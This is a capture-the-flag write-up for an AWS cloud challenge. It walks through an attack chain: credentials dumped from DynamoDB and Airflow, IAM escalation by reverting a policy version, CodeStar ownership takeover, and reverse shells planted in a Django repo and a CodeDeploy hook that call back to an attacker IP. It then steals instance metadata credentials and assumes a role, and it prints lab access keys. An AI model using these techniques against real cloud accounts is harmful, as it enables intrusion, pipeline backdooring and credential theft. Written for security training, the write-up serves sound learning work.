# The End of The Road

## Description



## Solution

Earlier from DynamoDB tables enumeration we've seen a table named `airflow`. Let's dump the information.

```bash
aws dynamodb scan --table-name airflow
{
    "Items": [
        {
            "password": {
                "S": "Fy[BpGD5M;F(Rnj["
            },
            "username": {
                "S": "tamayo"
            },
            "id": {
                "S": "1"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
```

This has `tamayo` credentials. We can find the airflow instance from first challenge URL which is running at port 8080. 

![](assets/airflow.png)

Login is successful with the found credentials.

![](assets/dags.png)

airflow has variables configured under `Admin` section. Let's navigate to that.

![](assets/vars.png)

We find a set of AWS credentials. Let's select both fields and under Actions we can select export to view the data.

```json
{
    "AWS_ACCESS_KEY_ID": "AKIA4NF5TOKM7EWE4TKC",
    "AWS_SECRET_ACCESS_KEY": "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"
}
```

```bash
aws sts get-caller-identity
{
    "UserId": "AIDA4NF5TOKM46H5JPGTM",
    "Account": "852948644505",
    "Arn": "arn:aws:iam::852948644505:user/tamayo"
}
```

These are of `tamayo` credentials. Enumerating using tools lead no where. Let's see if this user has any attached policies. 

```bash
aws iam list-attached-user-policies --user-name tamayo
{
    "AttachedPolicies": [
        {
            "PolicyName": "CodeStarRole",
            "PolicyArn": "arn:aws:iam::852948644505:policy/CodeStarRole"
        }
    ]
}
```

We see there is a policy attached to this user. Let's list the policy versions. 

```bash
aws iam list-policy-versions --policy-arn arn:aws:iam::852948644505:policy/CodeStarRole
{
    "Versions": [
        {
            "VersionId": "v5",
            "IsDefaultVersion": true,
            "CreateDate": "2022-03-27T09:49:25Z"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2022-03-27T08:07:00Z"
        }
    ]
}
```

We see there are two versions present. Let's view the policy version `v5` which is set to default. 

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::852948644505:policy/CodeStarRole --version-id v5
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "codestar:DescribeUserProfile",
                        "codestar:ListProjects",
                        "codestar:TagProject",
                        "codestar:DescribeProject",
                        "codecommit:TagResource"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListPolicyVersions",
                        "iam:GetPolicyVersion",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": [
                        "arn:aws:iam::852948644505:user/tamayo",
                        "arn:aws:iam::852948644505:policy/CodeStarRole"
                    ]
                },
                {
                    "Effect": "Allow",
                    "Action": "iam:SetDefaultPolicyVersion",
                    "Resource": "arn:aws:iam::852948644505:policy/CodeStarRole"
                }
            ]
        },
        "VersionId": "v5",
        "IsDefaultVersion": true,
        "CreateDate": "2022-03-27T09:49:25Z"
    }
}
```

This reveals another interesting privilege `iam:SetDefaultPolicyVersion` using which we can switch between versions to make them effective. Let's see if the other version have more privileges than current one.

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::852948644505:policy/CodeStarRole --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "codestar:AssociateTeamMember",
                        "codestar:ListProjects",
                        "codestar:TagProject",
                        "codestar:DescribeProject"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-03-27T08:07:00Z"
    }
}
```

We see interesting privileges that this role has. Let's set the default version as v1. 

```bash
aws iam set-default-policy-version --policy-arn arn:aws:iam::852948644505:policy/CodeStarRole --version-id v1
```

Now we can list the `codestar` projects.

```bash
aws codestar list-projects
{
    "projects": [
        {
            "projectId": "crimerecordmgmt",
            "projectArn": "arn:aws:codestar:us-east-2:852948644505:project/crimerecordmgmt"
        }
    ]
}
```

We see there is a project called `crimerecordmgmt`. Since we've `AssociateTeamMember` privilege we can add `tamayo` user as owner to the project. 

```bash
aws codestar associate-team-member --project-id crimerecordmgmt --user-arn arn:aws:iam::852948644505:user/tamayo --project-role Owner
```

Having owner privileges we can pull the code repository associated with the project. Let's describe the project to name of the Project. 

```bash
aws codestar describe-project --id crimerecordmgmt 
{
    "name": "CrimeRecordMgmt",
    "id": "crimerecordmgmt",
    "arn": "arn:aws:codestar:us-east-2:852948644505:project/crimerecordmgmt",
    "description": "AWS CodeStar created project",
    "createdTimeStamp": 1648399255.204,
    "stackId": "arn:aws:cloudformation:us-east-2:852948644505:stack/awscodestar-crimerecordmgmt/b0412830-adec-11ec-9ce7-06b8ee40b18c",
    "projectTemplateId": "arn:aws:codestar:us-east-2::project-template/codecommit/webapp-pythondjango-ec2",
    "status": {
        "state": "CreateComplete"
    }
}
```

It is `CrimeRecordMgmt`. To clone the repository we've to setup git to use `tamayo` AWS credentials. 

```bash
git config --global credential.helper '!aws codecommit credential-helper $@'
git config --global credential.UseHttpPath true 
```

The URL format can be found from [docs](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-https-unixes.html?icmpid=docs_acc_console_connect#setting-up-https-unixes-account). The final clone command is as below.

```bash
git clone https://git-codecommit.us-east-2.amazonaws.com/v1/repos/CrimeRecordMgmt crm
Cloning into 'crm'...
remote: Counting objects: 66, done.
Unpacking objects: 100% (66/66), 17.72 KiB | 61.00 KiB/s, done.
```

Going inside the `crm` folder we see the repository. It is clear that this is a django application. Checking the `crm/templates/index.html` reveals that this application still under maintenance. 

```html
<h1>Under Maintenance</h1>
<h2>Sorry for the inconvenience caused. We will try to serve you soon!
```

Exploring around we didn't find anything interesting. Git logs also shows nothing that looks important. Having owner privileges we can try to backdoor the application code and gain access to the instance that the code is running on. It may help further gaining access to the role that is attached to the instance that the project is running on. 

Having this ideology we can update any of the python file inside `crm` folder. Let's update `crm/admin.py` as below.

```python
import os,socket,pty
from django.contrib import admin

# Register your models here.
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ip>",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

> Note: Replace IP with your listener IP

Start the listener on port 1234 and do below steps to push the changes. 

```bash
git add .
git commit -m "minor fix"
git push
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Delta compression using up to 2 threads
Compressing objects: 100% (4/4), done.
Writing objects: 100% (4/4), 513 bytes | 513.00 KiB/s, done.
Total 4 (delta 2), reused 0 (delta 0), pack-reused 0
To https://git-codecommit.us-east-2.amazonaws.com/v1/repos/CrimeRecordMgmt
   40228af..3029b7d  master -> master
```

Now this goes to below process.

* CodePipeline will pull the changes
* CodeBuild will build the changes
* CodeDeploy will deploy the new code in the instance

After a minute or so we receive a callback. 

```bash
nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from ::1.
Ncat: Connection from ::1:35494.
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
```

We landed in a docker environment. Checking `buildspec.yml` we learn that the code changes are first tested in a docker container and if succeeded then it gets deployed on main instance. Observing `appspec.yml` we find hooks which runs after install.

```yml
hooks:
  AfterInstall:
    - location: scripts/install_dependencies
      timeout: 300
      runas: root
    - location: scripts/codestar_remote_access
      timeout: 300
      runas: root
    - location: scripts/start_server
      timeout: 300
      runas: root
```
We can place our reverse shell code in `scripts/start_server` to get shell access. Let's update it as below.

```bash
cd /home/ec2-user
/bin/bash -c "bash -i >& /dev/tcp/<ip>/1234 0>&1"
source environment/bin/activate

python3.8 manage.py collectstatic --noinput
/home/ec2-user/environment/bin/supervisord -c /home/ec2-user/supervisord.conf
```

Now we can push the changes

```bash
git add .
git commit -m 'minor fix'
git push
```

> Note: There is a reset script which removes all privileges. Make sure u set default version again and repeat the steps.

On AWS side this is what happens.

![](assets/source.png)

![](assets/build.png)

![](assets/deploy.png)

Once this is done we get shell on main environment. 

```bash
nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from ::1.
Ncat: Connection from ::1:35994.
(environment) id
id
uid=0(root) gid=0(root) groups=0(root)
(environment) ls -al / | head
ls -al / | head
total 20
dr-xr-xr-x  18 root root  257 Apr 12 15:26 .
dr-xr-xr-x  18 root root  257 Apr 12 15:26 ..
-rw-r--r--   1 root root    0 Apr 12 15:26 .autorelabel
lrwxrwxrwx   1 root root    7 Mar 16 01:51 bin -> usr/bin
dr-xr-xr-x   4 root root 4096 Mar 16 01:52 boot
drwxr-xr-x  15 root root 2820 Apr 12 15:26 dev
drwxr-xr-x  83 root root 8192 Apr 12 15:27 etc
drwxr-xr-x   3 root root   22 Apr 12 15:26 home
lrwxrwxrwx   1 root root    7 Mar 16 01:51 lib -> usr/lib
```

> Note: Shell dies immediately so we've to be fast. Or else we can maintain persistence by adding our SSH public key to authorized_keys to gain stable access

We can enumerate the attached role info by issuing below command.

```bash
curl 169.254.169.254/latest/meta-data/iam/info
```

Then enumerate credentials.

```bash
(environment) curl 169.254.169.254/latest/meta-data/iam/security-credentials/CodeStarWorker-crimerecordmgmt-WebApp                                          {
  "Code" : "Success",
  "LastUpdated" : "2022-04-13T02:18:51Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA4NF5TOKM2T4JB7LD",
  "SecretAccessKey" : "DnCChSGIykXxafJhypkRr8DFiwVOwKqC9O9pnD73",
  "Token" : "IQoJb3JpZ2l...",
  "Expiration" : "2022-04-13T08:44:06Z" 
}
```

This role has attached role policy

```bash
aws iam list-attached-role-policies --role-name CodeStarWorker-crimerecordmgmt-WebApp     {                                                                                             "AttachedPolicies": [                                                                         {                                                                                             "PolicyName": "CodeStarBackendPolicy",                                                   "PolicyArn": "arn:aws:iam::852948644505:policy/CodeStarBackendPolicy"                 }                                                                                     ]                                                                                     }
```

This has `CodeStarBackendPolicy` attached. Let's list versions.

```bash
aws iam list-policy-versions --policy-arn arn:aws:iam::852948644505:policy/CodeStarBackendPolicy
{
    "Versions": [
        {
            "VersionId": "v2",
            "IsDefaultVersion": true,
            "CreateDate": "2022-03-28T11:47:34Z"
        }
    ]
}
```

Let's view the policy using `get-policy-version`

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::852948644505:policy/CodeStarBackendPolicy --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "ec2:Describe*"
                    ],
                    "Resource": [
                        "*"
                    ],
                    "Effect": "Allow"
                },
                {
                    "Action": [
                        "s3:Get*",
                        "s3:List*"
                    ],
                    "Resource": [
                        "arn:aws:s3:::aws-codedeploy-us-east-2*",
                        "arn:aws:s3:::aws-codestar-us-east-2-852948644505-crimerecordmgmt-pipe",
                        "arn:aws:s3:::aws-codestar-us-east-2-852948644505-crimerecordmgmt-pipe/*"
                    ],
                    "Effect": "Allow"
                },
                {
                    "Action": [
                        "s3:GetObject"
                    ],
                    "Resource": [
                        "arn:aws:s3:::aws-codestar-us-east-2-852948644505/crimerecordmgmt/ssh/*",
                        "arn:aws:s3:::awscodestar-remote-access-signatures-us-east-2/*",
                        "arn:aws:s3:::awscodestar-templates-common/*"
                    ],
                    "Effect": "Allow"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListAttachedRolePolicies",
                        "iam:GetPolicyVersion",
                        "iam:ListPolicyVersions"
                    ],
                    "Resource": [
                        "arn:aws:iam::852948644505:role/CodeStarWorker-crimerecordmgmt-WebApp",
                        "arn:aws:iam::852948644505:policy/CodeStarBackendPolicy"
                    ]
                },
                {
                    "Action": "sts:AssumeRole",
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::852948644505:role/CallRecords"
                },
                {
                    "Action": [
                        "cloudformation:DescribeStackResources"
                    ],
                    "Resource": [
                        "arn:aws:cloudformation:us-east-2:852948644505:stack/awscodestar-crimerecordmgmt/b0412830-adec-11ec-9ce7-06b8ee40b18c"
                    ],
                    "Effect": "Allow"
                },
                {
                    "Action": [
                        "logs:CreateLogGroup",
                        "logs:CreateLogStream",
                        "logs:PutLogEvents",
                        "logs:DescribeLogStreams"
                    ],
                    "Resource": [
                        "arn:aws:logs:*:*:*"
                    ],
                    "Effect": "Allow"
                },
                {
                    "Action": [
                        "codedeploy:BatchGet*",
                        "codedeploy:Get*",
                        "codedeploy:List*"
                    ],
                    "Resource": [
                        "arn:aws:codedeploy:us-east-2:852948644505:application:crimerecordmgmt",
                        "arn:aws:codedeploy:us-east-2:852948644505:deploymentgroup:crimerecordmgmt/crimerecordmgmt-Env",
                        "arn:aws:codedeploy:us-east-2:852948644505:deploymentconfig:*"
                    ],
                    "Effect": "Allow"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-03-28T11:47:34Z"
    }
}
```

This policy has interesting privilege set. Using `sts:AssumeRole` we can switch to that role and can access whatever that role has privileges to.

```bash
aws sts assume-role --role-arn arn:aws:iam::852948644505:role/CallRecords --role-session-name test-role-identity
{
    "Credentials": {
        "AccessKeyId": "ASIA4NF5TOKM4OBE3WMT",
        "SecretAccessKey": "nI3UVDcqrScHzJ0US4cjQMNnj7PgcTmbhQTd6f+U",
        "SessionToken": "FwoGZXIvYXdzEL3//////////wEaDIG/g5grJ0wbpoIqiyK2AZE+GJu0Ef7qQNkjl20u/Q8yxPtUK/20vwWuO07HtQc9VxNBBv5QW1HLkaoJPBcHDsmZlN93ba0k7/hZuBzeXi5XMutvx23a4j8SJ5/sJVX9PMfVWQQhAQdavsxQq+pb20Pn7rzKvmvTIpsl1uKh/CbQ0Z/OJlcccHLOvm4HfUonZOPdxtieF5tSpCF3Z8an6B8/lBgql0FU0o07bmRz1MeQx1nBXglalR/i4f5xHKCFF2AoKix1KKWD2ZIGMi1F19o36u/m60PPYhMa5+ya2fYKLFdOqCgqDHbj1nbgcF6r4uF5IWLlBrlbdjg=",
        "Expiration": "2022-04-13T04:21:09Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA4NF5TOKM42T7TUG22:test-role-identity",
        "Arn": "arn:aws:sts::852948644505:assumed-role/CallRecords/test-role-identity"
    }
}
```

Configuring the credentials we can switch to the `CallRecords` role. Earlier we saw that there is a `call-records-1435289453` bucket which we don't have access to. Let's try to list the bucket.

```bash
aws s3 ls s3://call-records-1435289453
2022-04-12 22:52:07    2229552 bella-ciao.mp3
2022-04-12 22:52:04         44 flag.txt
```

Fun part that we've a song file dropped in the bucket. Flag can be downloaded using `cp` option.

```bash
aws s3 cp s3://call-records-1435289453/flag.txt .
cat flag.txt
ACVCTF{1m_0v3rfl0wn_w1th_s0_m4ny_m1sc0nf1gs}
```
